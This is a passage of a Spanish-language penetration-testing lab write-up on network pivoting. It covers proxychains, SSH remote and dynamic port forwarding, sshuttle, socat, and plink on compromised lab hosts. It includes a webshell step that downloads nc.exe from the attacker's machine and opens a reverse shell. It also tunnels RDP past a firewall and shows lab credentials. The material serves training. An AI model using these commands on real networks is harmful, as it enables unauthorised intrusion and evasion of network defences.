+#       proxy types: http, socks4, socks5, raw
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 192.168.50.63 9999 &lt;---
+</code></pre></div></div>
+
+<p>La IP es aquella asociada a la CONFLUENCE01 y el puerto el desginado en el comando SSH. De esta forma, empleamos el siguiente comando para utilizar smbclient con proxychains:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:445  ...  OK
+
+        Sharename       Type      Commen
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+    scripts         Disk
+        Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:139  ...  OK
+[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:139  ...  OK
+do_connect: Connection to 172.16.50.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre></div></div>
+
+<p>También podemos utilizar otras herramientas como por ejemplo Nmap. Recordamos que PGDATABASE01 está conectado a una tercera subnet, 172.16.50.x, de esta forma, la escaneamos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 17:26 EDT
+Initiating Parallel DNS resolution of 1 host. at 17:26
+Completed Parallel DNS resolution of 1 host. at 17:26, 0.09s elapsed
+DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 17:26
+Scanning 172.16.50.217 [20 ports]
+[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:111 &lt;--socket error or timeout!
+[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:22 &lt;--socket error or timeout!
+...
+[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:5900 &lt;--socket error or timeout!
+Completed Connect Scan at 17:30, 244.33s elapsed (20 total ports)
+Nmap scan report for 172.16.50.217
+Host is up, received user-set (9.0s latency).
+Scanned at 2022-08-20 17:26:47 EDT for 244s
+
+PORT     STATE  SERVICE       REASON
+21/tcp   closed ftp           conn-refused
+22/tcp   closed ssh           conn-refused
+23/tcp   closed telnet        conn-refused
+25/tcp   closed smtp          conn-refused
+53/tcp   closed domain        conn-refused
+80/tcp   closed http          conn-refused
+110/tcp  closed pop3          conn-refused
+111/tcp  closed rpcbind       conn-refused
+135/tcp  open   msrpc         syn-ack
+139/tcp  open   netbios-ssn   syn-ack
+143/tcp  closed imap          conn-refused
+443/tcp  closed https         conn-refused
+445/tcp  open   microsoft-ds  syn-ack
+993/tcp  closed imaps         conn-refused
+995/tcp  closed pop3s         conn-refused
+1723/tcp closed pptp          conn-refused
+3306/tcp closed mysql         conn-refused
+3389/tcp open   ms-wbt-server syn-ack
+5900/tcp closed vnc           conn-refused
+8080/tcp closed http-proxy    conn-refused
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 244.62 seconds
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="33-ssh-remote-port-forwarding">3.3. SSH Remote Port Forwarding.</h4>
+
+<p>Hasta ahora hemos cubierto, casos en los que nos aprovechamos de una conexión SSH entre un cliente y un servidor en una red interna que utilizábamos para interactuar con nuestro entorno de Kali con un host remoto en una red inaccesible. Es decir, hemos creado un túnel SSH dentro de una LAN para crear una redirección de puertos</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230608115055.png" text-align="center" />
+</div>
+
+<p>Ahora vamos a cubrir una forma de evadir medidas de seguridad de red, como firewalls o IDS muy frecuentes en escenarios de auditorías reales, creando un túnel SSH de entre nuestra Kali y un host de la LAN que estamos asaltando creando un SSH Remote Port Forwarding, o dicho de otra forma, en vez de conectarnos a un cliente SSH que luego se conecta a un servidor SSH nos conectamos directamente a un servidor SSH que redirige los paquetes sobre otra máquina de la red interna.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230609134241.png" text-align="center" />
+</div>
+
+<p>Como ya hemos comentado al principio de esta sección, la tunelización de los datos que enviamos provoca que los datos circulantes entre nuestras dos máquinas sea percibido externamente como otro tipo de tráfico, en este caso; tráfico SSH, más comúnmente permitido que el tráfico HTTP, FTP o de cualquier otra índole entrante.</p>
+
+<p>Así, vamos a ver un ejemplo cambiando el escenario presentado anteriormente.</p>
+
+<p>En el caso anterior nuestra kali interactuaba con un cliente SSH llamado CONFLUENCE01 directamente. Ahora, vamos a suponer como en la imagen anterior que existe un firewall entre medias, el firewall está configurado para que el único puerto al que podemos conectarnos desde nuestra máquina Kali es el TCP 8090. Esto significa que aunque seguimos teniendo la capacidad de comprometer el servidor no podemos conectarnos a ningún otro puerto para realizar un portforwarding como en los ejemplos anteriores pues el firewall bloquea las conexiones.</p>
+
+<p>Sin emabrgo, afortunadamente para nosotros CONFLUENCE01 tiene un cliente SSH. Así, podemos configurar un servidor SSH. Dado que el firewall permite tráfico SSH, podemos utilizar esta conexión para realizar un portforwarding.</p>
+
+<p>Primero iniciamos el servicio ssh en nuestra kali:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ sudo systemctl start ssh
+[sudo] password for kali: 
+
+kali@kali:~$ sudo ss -ntplu 
+Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process
+tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*     users:(("sshd",pid=181432,fd=3))
+tcp   LISTEN 0      128             [::]:22           [::]:*     users:(("sshd",pid=181432,fd=4))
+</code></pre></div></div>
+
+<p>Y ahora introducimos el siguiente comando en una shell completamente interactiva CONFLUENCE01 :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+&lt; 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4   
+Could not create directory '/home/confluence/.ssh'.
+The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
+ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+kali@192.168.118.4's password:
+</code></pre></div></div>
+
+<p>El comando anterior configura el remote port forwarding con la opción <strong>-R</strong> y tiene una sintaxis muy similar a la opción de reenvío de puerto local. También toma dos pares de sockets como argumento. El socket de escucha se define primero y el socket de reenvío es el segundo.</p>
+
+<p>En este caso, queremos escuchar en el puerto <strong>2345</strong> en nuestra máquina Kali ( <strong>127.0.0.1:2345</strong> ) y reenviar todo el tráfico al puerto PostgreSQL en PGDATABASE01 ( <strong>10.4.50.215:5432</strong> ).</p>
+
+<p>Automáticamente en nuestra kali se ha activado un puerto de escucha:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ ss -ntplu
+Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
+tcp   LISTEN 0      128        127.0.0.1:2345      0.0.0.0:*
+tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
+tcp   LISTEN 0      128             [::]:22           [::]:*
+</code></pre></div></div>
+
+<p>Así;</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres
+Password for user postgres: 
+psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+postgres=# \l
+                                  List of databases
+    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
+------------+----------+----------+-------------+-------------+-----------------------
+ confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+            |          |          |             |             | postgres=CTc/postgres
+ template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+            |          |          |             |             | postgres=CTc/postgres
+(4 rows)
+
+postgres=# 
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="34-ssh-remote-dynamic-port-forwarding">3.4. SSH Remote Dynamic Port Forwarding</h4>
+
+<p>De la misma forma que ocurría con el local port forwarding, el remote por forwarding tiene una falla y es que no nos permite gestionar varios conexiones a distintos sockets.</p>
+
+<p>Para ello surge el <em>remote dynamic port forwarding</em>, para proveernos de esta flexibilidad. El concepto es el mismo, gestionar un portforwarding a través de un túnel SSH en el exterior de la red que queremos asaltar gestionando varias conexiones:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230611190125.png" text-align="center" />
+</div>
+
+<p>Vamos a exponer un ejemplo planteando otro caso.</p>
+
+<p>Supongamos que de nuevo hemos ganado acceso sobre la CONFLUENCE01 a través de un epxloit y también sabemos que esta máquina está protegida por un firewall.</p>
+
+<p>Nuestro primer pensamiento en esta posición debería ser que el firewall, además de otros puertos, puede estar tapando otros hosts expuestos en la misma red. Por tanto, nos interesa escanear la red desde la máquina asaltada:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>confluence@confluence01:/opt/atlassian/confluence/bin$ for i in $(seq 1 254); do ping -c1 192.168.212.$i| grep "1 received" -C4; done
+PING 192.168.212.63 (192.168.212.63) 56(84) bytes of data.
+64 bytes from 192.168.212.63: icmp_seq=1 ttl=64 time=0.022 ms
+
+--- 192.168.212.63 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.022/0.022/0.022/0.000 ms
+</code></pre></div></div>
+
+<p>Aunque el escáner hecho con ping haya fallado esto no es concluyente porque puede ser que una máquina levantada en la red no responda a los paquetes ping.</p>
+
+<p>Así, lo que hacemos es un <em>remote dynamic port forwarding</em>. El comando es similar al <em>remote port forwarding</em> solo que en lugar de pasar como argumento dos sockets (de escucha y de desvío como en el caso anterior) sólo pasaremos un puerto que será el puerto de escucha del SocksProxy en la máquina Kali.</p>
+
+<p>Así, en nuestra máquina Kali iniciamos el servicio ssh:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ sudo systemctl start ssh          
+[sudo] password for kali: 
+                   
+</code></pre></div></div>
+
+<p>Y seguidamente lanzamos el comando</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 9998 kali@192.168.45.197
+Could not create directory '/home/confluence/.ssh'.
+The authenticity of host '192.168.45.197 (192.168.45.197)' can't be established.
+ECDSA key fingerprint is SHA256:lO9h0Bs6EiPc9FhxTikOYiKkSPArf1E0FxY7uFgrHss.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+kali@192.168.45.197's password: 
+</code></pre></div></div>
+
+<p>Modificamos el fichero de configuración de proxychains con la ip y puerto de escucha :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ tail /etc/proxychains4.conf
+#       proxy types: http, socks4, socks5, raw
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5  127.0.0.1 9998
+</code></pre></div></div>
+
+<p>Y empelamos Nmap con proxychains para escanear la red:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains nmap -Pn -p9000-9100 -T4 10.4.212.64
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 17:08 EDT
+[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.212.64:9055 &lt;--socket error or timeout!
+[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.212.64:9100 &lt;--socket error or timeout!
+[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.212.64:9062  ...  OK
+
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="35-using-sshuttle">3.5. Using sshuttle.</h4>
+
+<p>En situaciones en las que tenemos acceso directo a un servidor SSH, detrás del cual hay una red interna más compleja, el reenvío de puertos dinámico clásico puede ser difícil de administrar. </p>
+
+<p>El kit <em>sshuttle</em> es una herramienta que convierte una conexión SSH en algo similar a una VPN mediante la configuración de rutas locales que fuerzan el tráfico a través del túnel SSH. Sin embargo, requiere privilegios de root en el cliente SSH y Python3 en el servidor SSH, por lo que no siempre es la opción más liviana. En el escenario apropiado, sin embargo, puede ser muy útil.</p>
+
+<p>En nuestro entorno de laboratorio, tenemos acceso SSH a PGDATABASE01, al que podemos acceder a través de un reenvío de puerto configurado en CONFLUENCE01. Ejecutemos sshuttle a través de esto para observar sus capacidades.</p>
+
+<p>Primero, podemos configurar un port forwarding en un shell en CONFLUENCE01, escuchando en el puerto 2222 en la interfaz WAN y reenviando al puerto 22 en PGDATABASE01.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+&lt;/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+</code></pre></div></div>
+
+<p>Ahora empleamos la herramienta sshuttle</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
+[local sudo] Password: 
+
+database_admin@192.168.50.63's password:
+
+c : Connected to server.
+Failed to flush caches: Unit dbus-org.freedesktop.resolve1.service not found.
+fw: Received non-zero return code 1 when flushing DNS resolver cache.
+
+</code></pre></div></div>
+
+<p>Aunque no recibimos muchos resultados de sshuttle, en teoría, debería haber configurado el enrutamiento en nuestra máquina Kali para que cualquier solicitud que hagamos a los hosts en las subredes que especificamos se envíe de forma a través de la conexión SSH. Probemos si esto funciona intentando conectarnos al recurso compartido SMB en HRSHARES en una nueva terminal.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+
+        Sharename       Type      Commen
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        scripts         Disk
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 172.16.50.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+kali@kali:~$
+</code></pre></div></div>
+<p><br /></p>
+
+<h3 id="4-port-forwarding-with-windows-tools">4. Port Forwarding with Windows Tools.</h3>
+
+<h4 id="41-sshexe">4.1. SSH.exe</h4>
+
+<p>La primera opción que tenemos es comprobar si el sistema Windows tiene el servicio SSH instalado para poder aplicar lo aprendido anteriormente referente al SSH tunneling.</p>
+
+<p>En las versiones de Windows con SSH instalado, encontraremos <strong>scp.exe</strong> , <strong>sftp.exe</strong> , <strong>ssh.exe</strong> , junto con otras utilidades ssh-* en la ubicación <strong>%systemdrive%\Windows\System32\OpenSSH</strong> de forma predeterminada.</p>
+
+<p>Así, pongámos un ejemplo práctico. Supongámos que hemos ganado acceso a una máquina</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.187.64
+</code></pre></div></div>
+
+<p>Enumerando la máquina descubrimos que tiene habilitado SSH.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\rdp_admin&gt;where ssh
+C:\Windows\System32\OpenSSH\ssh.exe
+
+C:\Users\rdp_admin&gt;ssh.exe -V
+OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
+</code></pre></div></div>
+
+<p>Así, habilitamos el servicio ssh en nuestra kali:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ sudo systemctl start ssh   
+[sudo] password for kali: 
+</code></pre></div></div>
+
+<p>Y en el host Windows ceramos un remote dynamic portforwarding:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\rdp_admin&gt;ssh -N -R 9998 kali@192.168.45.211
+The authenticity of host '192.168.45.211 (192.168.45.211)' can't be established.
+ECDSA key fingerprint is SHA256:lO9h0Bs6EiPc9FhxTikOYiKkSPArf1E0FxY7uFgrHss.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.45.211' (ECDSA) to the list of known hosts.
+kali@192.168.45.211's password:
+</code></pre></div></div>
+
+<p>Y podemos emplear proxychains:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/Downloads$ proxychains ./ssh_exe_exercise_client.bin -i 10.4.187.215
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+Connecting to 10.4.187.215:4141
+[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.187.215:4141  ...  OK
+Flag: "OS{b7a21c79d7ae9fb046e944fedbacef8e}"
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="42-plink">4.2. Plink</h4>
+
+<p>En el caso de no tener habilitado OpenSSH en el host de Windows (es una práctica común que los administradores deshabiliten dicho cliente por razones de seguridad).</p>
+
+<p>Sin embargo, antes de que se desarollara OpenSSH los administradores empleaban todavía podemos intentar utilizar PuTTY y su contrapartida cli; PLINK (PuTTY Link).</p>
+
+<p>Una de las principales ventajas de emplear estas herramientas es que, al ser bastante populares entre administradores de sistemas y redes rara vez serán detectadas por mecanismos de seguridad (antivirus).</p>
+
+<p>Veamos un ejemplo de aplicación en el siguiente escenario. En este escenario, encontramos que MULTISERVER03 ahora tiene una aplicación web en el puerto TCP 80 expuesto. Todos los demás puertos de entrada están bloqueados por un firewall, por lo que RDP tampoco está disponible. </p>
+
+<p>El diseño es muy parecido al siguiente diagrama:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230612171608.png" text-align="center" />
+</div>
+
+<p>Hemos conseguido RCE a través de la subida de una webshell sobre el servidor web al que tenemos acceso.</p>
+
+<p>A partir de aquí y aprovechando que el firewall sólo bloquea conexiones entrantes, subimos el binario ‘nc.exe’ y creamos una reverse shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ sudo systemctl start apache2
+[sudo] password for kali:
+
+kali@kali:~$ find / -name nc.exe 2&gt;/dev/null
+/usr/share/windows-resources/binaries/nc.exe
+
+kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
+
+kali@kali:~$ nc -nvlp 4446
+listening on [any] 4446 ...
+</code></pre></div></div>
+
+<p>Seguidamente, desde el webshell ejecutamos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell wget -Uri http://192.168.45.211/nc.exe -OutFile C:\Windows\Temp\nc.exe; C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.211 4446
+</code></pre></div></div>
+
+<p>Y en nuestra Kali recibiremos una conexión proveniente del host Windows:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+listening on [any] 4446 ...
+connect to [192.168.118.4] from (UNKNOWN) [192.168.50.64] 51889
+Microsoft Windows [Version 10.0.20348.825]
+(c) Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv&gt;
+</code></pre></div></div>
+
+<p>Ahora, transportamos sobre nuestro host Windows la utilidad ‘plink.exe’ desde nuestra kali:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ find / -name plink.exe 2&gt;/dev/null
+/usr/share/windows-resources/binaries/plink.exe
+
+kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
+[sudo] password for kali: 
+</code></pre></div></div>
+
+<p><br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\windows\system32\inetsrv&gt;powershell wget -Uri http://192.168.45.211/plink.exe -OutFile C:\Windows\Temp\plink.exe
+powershell wget -Uri http://192.168.45.211/plink.exe -OutFile C:\Windows\Temp\plink.exe
+
+c:\windows\system32\inetsrv&gt;
+</code></pre></div></div>
+
+<p>Una vez tenemos el ejecutable en nuestra máquina, recordemos que la MULTISERVER03 ofrece el servicio RDP de forma que podemos usar Plink.exe para crear un túnel SSH sobre el que encapsular una conexión RDP y obtener acceso al GUI del servidor bypaseando el firewall.</p>
+
+<p>Primero, habilitamos el servicio SSH en nuestra máquina Kali pues la conexión se tuneliza a través de SSH:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ sudo systemctl start ssh 
+</code></pre></div></div>
+
+<p>Seguidamente introducimos el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\windows\system32\inetsrv&gt;C:\Windows\Temp\plink.exe -ssh -l kali -pw &lt;YOUR PASSWORD HERE&gt; -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.211
+C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.211
+The host key is not cached for this server:
+  192.168.118.4 (port 22)
+You have no guarantee that the server is the computer
+you think it is.
+The server's ssh-ed25519 key fingerprint is:
+  ssh-ed25519 255 SHA256:q1QQjIxHhSFXfEIT4gYrRF+zKr0bcLMOJljoINxThxY
+If you trust this host, enter "y" to add the key to
+PuTTY's cache and carry on connecting.
+If you want to carry on connecting just once, without
+adding the key to the cache, enter "n".
+If you do not trust this host, press Return to abandon the
+connection.
+Store key in cache? (y/n, Return cancels connection, i for more info) y
+Using username "kali".
+Linux kali 5.16.0-kali7-amd64 #1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01) x86_64
+
+The programs included with the Kali GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Aug 21 15:50:39 2022 from 192.168.50.64
+</code></pre></div></div>
+
+<p>Este comando genera un remote portforwarding desde el puerto 9833 de nuestra kali hacia el puerto 3389 de la máquina MULTISERVER03 (el servicio rdp) a través de SSH.</p>
+
+<p>Así, ahora comprobamos en nuestra kali que el susodicho puerto está escuchando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ ss -punta               
+Netid State  Recv-Q Send-Q        Local Address:Port     Peer Address:Port Process                                  
+udp   UNCONN 0      0                   0.0.0.0:57093         0.0.0.0:*                                             
+udp   ESTAB  0      0      192.168.127.134%eth0:68    192.168.127.254:67                                            
+tcp   LISTEN 0      128               127.0.0.1:9833          0.0.0.0:*  
+[...]
+</code></pre></div></div>
+
+<p>Y nos conectamos con xfreerdp a nuestro puerto local, esta conexión se redirigirá bypaseando el firewall sobre el puerto 3389 de la máquina de destino a través de un túnel SSH:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
+[12:39:52:343] [70068:70069] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
+[12:39:52:343] [70068:70069] [WARN][com.freerdp.crypto] - CN = MULTISERVER03
+[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
+[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] - The hostname used for this connection (127.0.0.1:9833) 
+[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
+[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] - Common Name (CN):
+[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] -      MULTISERVER03
+[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
+Certificate details for 127.0.0.1:9833 (RDP-Server):
+        Common Name: MULTISERVER03
+        Subject:     CN = MULTISERVER03
+        Issuer:      CN = MULTISERVER03
+        Thumbprint:  e1:52:61:da:af:34:9c:56:0a:db:98:01:3c:17:c1:a0:68:da:7b:ca:75:24:a9:dc:50:63:3b:07:e2:63:3f:1c
+The above X.509 certificate could not be verified, possibly because you do not have
+the CA certificate in your certificate store, or the certificate has expired.
+Please look at the OpenSSL documentation on how to add a private CA to the store.
+Do you trust the above certificate? (Y/T/N) y
+[12:39:55:658] [70068:70069] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
+[12:39:55:658] [70068:70069] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
+[12:39:55:674] [70068:70069] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
+[12:39:55:674] [70068:70069] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
+[12:39:56:334] [70068:70069] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
+[12:40:46:596] [70068:70068] [ERROR][com.freerdp.core] - freerdp_abort_connect:freerdp_set_last_error_ex ERRCONNECT_CONNECT_CANCELLED [0x0002000B]
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="43-netsh">4.3. Netsh.</h4>
+
+<p>En último término, existe una forma nativa de crear un port foward en Windows que deberíamos explorar, la built-in firewall configuration tool Netsh (Network Shell).</p>
+
+<p><br /></p>
+
+<h4 id="1-practice---ssh-local-port-forwarding">1. Practice - SSH Local Port Forwarding.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(student㉿8772c0f42288)-[~]
+└─$ ss -a
+Netid                  State                      Recv-Q                  Send-Q                                    Local Address:Port                                         Peer Address:Port                   Process                  
+nl                     UNCONN                     0                       0                                                  rtnl:946                                                      *                                                
+nl                     UNCONN                     0                       0                                                  rtnl:kernel                                                   *                                                
+nl                     UNCONN                     768                     0                                               tcpdiag:kernel                                                   *                                                
+nl                     UNCONN                     4352                    0                                               tcpdiag:ss/81                                                    *                                                
+nl                     UNCONN                     0                       0                                                  xfrm:kernel                                                   *                                                
+nl                     UNCONN                     0                       0                                                 audit:kernel                                                   *                                                
+nl                     UNCONN                     0                       0                                             fiblookup:kernel                                                   *                                                
+nl                     UNCONN                     0                       0                                                   nft:kernel                                                   *                                                
+nl                     UNCONN                     0                       0                                                uevent:kernel                                                   *                                                
+nl                     UNCONN                     0                       0                                                  genl:kernel                                                   *                                                
+u_str                  ESTAB                      0                       0                                                     * 27630                                                   * 0                                               
+u_str                  ESTAB                      0                       0                                                     * 27665                                                   * 27666                                           
+u_str                  ESTAB                      0                       0                                                     * 27666                                                   * 27665                                           
+udp                    UNCONN                     0                       0                                            127.0.0.11:51029                                             0.0.0.0:*                                               
+tcp                    LISTEN                     0                       511                                             0.0.0.0:http                                              0.0.0.0:*                                               
+tcp                    LISTEN                     0                       128                                             0.0.0.0:ssh                                               0.0.0.0:*                                               
+tcp                    LISTEN                     0                       4096                                         127.0.0.11:41673                                             0.0.0.0:*                                               
+tcp                    ESTAB                      0                       52                                           172.18.0.2:ssh                                        192.168.45.240:40484                                           
